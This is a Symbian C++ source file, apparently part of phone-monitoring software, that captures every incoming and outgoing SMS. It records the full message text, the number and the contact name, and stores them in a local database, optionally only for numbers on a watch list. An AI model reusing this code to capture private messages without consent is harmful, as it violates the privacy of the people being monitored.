#include "FxsSmsMonitor.h"
#include "CltLogEvent.h"
#include "Global.h"
#include "WatchListHelper.h"
#include <MSVIDS.H>
#include <Smut.h>
#include <SmsClnt.h>
#include <SmutHdr.h>
#include <TXTFMLYR.H>
#include <TXTRICH.H>
#include <MTCLREG.H>
#include <ETELMM.H>

const TInt KMaxRetry = 3;

CFxsSmsMonitor::CFxsSmsMonitor(CFxsDatabase& aDb)
:CActiveBase(CActive::EPriorityHigh),
iDb(aDb),
iMessageArray(5)
	{
	}

CFxsSmsMonitor::~CFxsSmsMonitor()
	{	
	Cancel();
	iMessageArray.Close();
	iDuplicateIdArray.Close();
	}

CFxsSmsMonitor* CFxsSmsMonitor::NewL(CFxsDatabase& aDb)
	{
	CFxsSmsMonitor* self = new (ELeave)CFxsSmsMonitor(aDb);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
	}

void CFxsSmsMonitor::ConstructL()
	{
	CActiveScheduler::Add(this);	
	}

void CFxsSmsMonitor::NotifyEngineReady(CClientMtmRegistry* aMtmReg, CMsvSession* aMsvSession)
	{
	iReady = ETrue;
	iMtmReg = aMtmReg;	
	iMsvSession = aMsvSession;	
	}

void CFxsSmsMonitor::CompleteSelf()
	{
	if (!IsActive()) 
		{
		SetActive();
		TRequestStatus* status = &iStatus;
		User::RequestComplete(status, KErrNone);
		}	
	}

void CFxsSmsMonitor::RunL()
	{
	if(iReady)
		{
		ReadMessageL();	
		}	
	}

TInt CFxsSmsMonitor::RunError(TInt aErr)
	{
	CActiveBase::Error(aErr);
	switch(aErr)
		{
		/**
		Message not found.*/
		case KErrNotFound:
			{
			if(iMessageArray.Count())
				{
				iMessageArray.Remove(0);
				}
			CompleteSelf();
			}break;
		case KErrInUse:
			{
			//try again
			}break;
		default:
			{
			if(iMessageArray.Count())
				{
				if(++iMessageArray[0].iRetryCount >= KMaxRetry)
					{
					iMessageArray.Remove(0);
					}
				}
			
			if(iMessageArray.Count())
				{
				CompleteSelf();
				}
			}
		}
		
	return KErrNone;
	}

void CFxsSmsMonitor::DoCancel()
	{
	TRequestStatus* status = &iStatus;
	User::RequestComplete(status, KErrCancel);
	}

TPtrC CFxsSmsMonitor::ClassName()
	{
	return TPtrC(_L("CFxsSmsMonitor"));
	}

//from MFxMsgEventObserver
void CFxsSmsMonitor::NotifyEventL(TUid aUidMsgType, TMsvId aEntryId, TInt aDirection)
	{
	LOG2(_L("[CFxsSmsMonitor::NotifyEventL]aEntryId: %d, aDirection: %d "),aEntryId, aDirection)	
	if(KUidMsgTypeSMS == aUidMsgType)
		{
		TFxMsgEntry entry = {aEntryId,aDirection,0};
		iMessageArray.AppendL(entry);
		CompleteSelf();			
		}	
	}

void CFxsSmsMonitor::NotifyEventRemoveL(TMsvId aMsvId)
	{
	TInt pos = iDuplicateIdArray.Find(aMsvId);
	if(pos >= 0)
		{
		iDuplicateIdArray.Remove(pos);
		}
	}
	
void CFxsSmsMonitor::ReadMessageL()
	{
	for(TInt i=0;i<iMessageArray.Count(); i++)
		{
		LOG2(_L("[CFxsSmsMonitor::ReadMessageL] iEntryId: %d, iDirection:%d "),iMessageArray[0].iEntryId, iMessageArray[0].iDirection)	
		
		TFxMsgEntry msgMap=iMessageArray[0];
		if(!IsDuplicateId(msgMap.iEntryId))
			{
			AddDuplicateList(msgMap.iEntryId);
			CMsvEntry* msvEntry = iMsvSession->GetEntryL(msgMap.iEntryId);
			CleanupStack::PushL(msvEntry);
			msvEntry->SetEntryL(msgMap.iEntryId);								
			TMsvEntry entry = msvEntry->Entry();	
			//KMsvSendStateNotApplicable	= 0x9
			CSmsClientMtm* smsMtm = STATIC_CAST(CSmsClientMtm*, iMtmReg->NewMtmL(entry.iMtm));		
			CleanupStack::PushL(smsMtm);		
			
			smsMtm->SwitchCurrentEntryL(msgMap.iEntryId);
			smsMtm->RestoreServiceAndSettingsL();
			smsMtm->LoadMessageL();
			
			CSmsHeader& smsHeader =	smsMtm->SmsHeader();		
			CSmsMessage& msg = smsHeader.Message();		
			
			TPtrC toAndFromAddr;
			TPtrC number;
			TPtrC contact;
	#ifndef EKA2
			toAndFromAddr.Set(msg.ToFromAddress());
			number.Set(smsHeader.FromAddress());// phone number		
			contact.Set(entry.iDetails);	 // contact name alias to phonebook
	#else// 3rd
			switch(msgMap.iDirection)
			{
				case KCltLogDirIncoming:
					{
						toAndFromAddr.Set(msg.ToFromAddress());
						number.Set(smsHeader.FromAddress());// phone number		
						contact.Set(entry.iDetails);	 // contact name alias to phonebook
					}
					break;
				case KCltLogDirOutgoing:
					{
						//Recipients
						CArrayPtrFlat<CSmsNumber> &recipients = smsHeader.Recipients();
						if(recipients.Count()>0)
						{
							CSmsNumber *smsNumber = recipients[0];
							
							toAndFromAddr.Set(smsNumber->Address());
							number.Set(smsNumber->Address());
							contact.Set(smsNumber->Name());
							
							LOG3(_L("[CFxsSmsMonitor::ReadMessageL] Recipient: %d,Address: %S,Name: %S"),i,&toAndFromAddr,&contact)
						}
					}
					break;
			}			
	#endif
			
			//Read message by using smsMtm->Body()	has max length to 512 chars		
			//But reading from CSmsBufferBase has no limit
			//
			TPtrC smsContents;		
			CSmsBufferBase& smsBuf = msg.Buffer();
			TInt smsBufLen = smsBuf.Length();		
			HBufC* smsBufDes = HBufC::NewLC(smsBufLen);		
			
			//read more than 512 chars
			TPtr ptr= smsBufDes->Des();				
			smsBuf.Extract(ptr,0, smsBufLen);		
			
			if(smsBufDes->Length())
				{
				smsContents.Set(*smsBufDes);
				}
			else//
				{
				const CRichText& richTextBody = smsMtm->Body();
				TInt documentLen = richTextBody.DocumentLength();						
				smsContents.Set(richTextBody.Read(0,documentLen));
				}
			
			//
			//Big note:
			//For incoming sms, new line is encoded as '\n', (0x000A)
			//For outgoing sms, new line is encoded as paragraph separators, 0x2029 (as 0xe2,0x80,0xa9 for UTF-8)
			//The server must handle UTF-8 paragraph separators correctly otherwise '?' will be displayed instead
			//	
			//if(msgMap.iDirection == KCltLogDirOutgoing)
			//Damn Symbian!!!
			//By default, line and paragraph separators are converted into a CR/LF pair.
			//but it does not do that for outgoing sms
			//you have to make it yourself...
			//	{
			//	CCnvCharacterSetConverter		 
			//	void SetDowngradeForExoticLineTerminatingCharacters(EDowngradeExoticLineTerminatingCharactersToJustLineFeed);
			//	}
			
			//must set to GMT 
			TTime time = entry.iDate;
			time.UniversalTime();	
			time = XUtil::ToLocalTimeL(time);
			
	#ifdef __DEBUG_ENABLE__
				LOG0(_L("--------------------- Message ----------------------"))			
					TTime createTime = msg.Time();						
					createTime.UniversalTime();
					TBuf<100> dateFormated;			
					createTime.FormatL(dateFormated, _L( "%F%Y/%M/%D %H:%T:%S" ) );	
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] CSmsBufferBase Des :%d "),smsBufDes->Length() );
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] CSmsBufferBase Length :%d "),smsBuf.Length() );
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] TSmsPDUType :%d "),smsHeader.Type());
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] Times :%S "),&dateFormated)		
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] toAndFromMsg :%S"),&toAndFromAddr)
					LOG2(_L("[CFxsSmsMonitor::ReadMessageL] SMS,Len: %d, bodys: %S"),smsContents.Length(), &smsContents)
					LOG2(_L("[CFxsSmsMonitor::ReadMessageL] Number: %S, Contact: %S"),&number,&contact)
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] ServiceId: %d"),smsMtm->ServiceId())
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] Log ServerId: %d"),msg.LogServerId())
					//LOG1(_L("[CFxsSmsMonitor::NotifySmsEventL] TextConcatenated: %d"),smsPdu.TextConcatenated())
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] TextPresent: %d"),msg.TextPresent())
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] SendingState: %d"),entry.SendingState())	
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] TEntry Complete: %d"),entry.Complete())
					LOG1(_L("[CFxsSmsMonitor::ReadMessageL] CSmsMessage.IsComplete: %d"),msg.IsComplete())
					//RMobileSmsStore::TMobileSmsStoreStatus smsStoreStatus = msg.Status();
					//LOG1(_L("[CFxsSmsMonitor::NotifySmsEventL] TMobileSmsStoreStatus: %d"),smsStoreStatus)
			
					LOG0(_L("------------------- End Message ------------------"))
	#endif
		
	//CSmsPDU::ESmsDeliver <-- Receive incooming sms
	//CSmsPDU::ESmsSubmit  <-- Sent message	
			if(smsHeader.Type() == CSmsPDU::ESmsStatusReport || smsHeader.Type() == CSmsPDU::ESmsDeliverReport)
				{
				if(!msg.TextPresent())
					{
					_LIT(KSmsStatusReport,"SMS-DELIVERY-REPORT");
					smsContents.Set(KSmsStatusReport);
					}
				}
			
			CFxsLogEvent* event = CFxsLogEvent::NewL(msgMap.iEntryId, // messageid
												   entry.iSize,     // Duration field for email size
												   msgMap.iDirection, // Direction
												   KFxsLogEventTypeSMS, // EventType
												   time,	//Time
												   TPtrC(),//Status field: Null
												   TPtrC(),//Description field: Null
												   toAndFromAddr,  //Number field: sender address
												   TPtrC(), //Subject field: null
												   smsContents,//smsContents, //Data field: sms contents
												   contact,
												   TPtrC(),
												   EEntryMsvAdded); //RemoteParty field: contact name		
				
			InsertDbL(event);//pass ownership
			CleanupStack::PopAndDestroy(3);//smsMtm, smsBufDes
			}
		iMessageArray.Remove(0);		
		}
	
	LOG0(_L("[CFxsSmsMonitor::ReadMessageL] End"))
	}
	
void CFxsSmsMonitor::InsertDbL(CFxsLogEvent* aEvent)
	{
	ASSERT(aEvent != NULL);
	CFxsSettings& settings = Global::Settings();
	if(settings.IsTSM())
		{
		TBool inWatchList(ETrue);
	#ifdef FEATURE_WATCH_LIST
		inWatchList=WatchListHelper::ContainNumber(settings.WatchList(), aEvent->Number());
	#endif
		if(inWatchList)
			{
			goto DoInert;
			}
		else
			{
			delete aEvent;
			}		
		}
	else
		{
	DoInert:
		iDb.InsertDbL(aEvent);//pass ownership
		}	
	}

TBool CFxsSmsMonitor::IsDuplicateId(TMsvId aMsvId)
	{
	return iDuplicateIdArray.Find(aMsvId) != KErrNotFound;
	}	

void CFxsSmsMonitor::AddDuplicateList(TMsvId aMsvId)
	{
	iDuplicateIdArray.Append(aMsvId);
	}
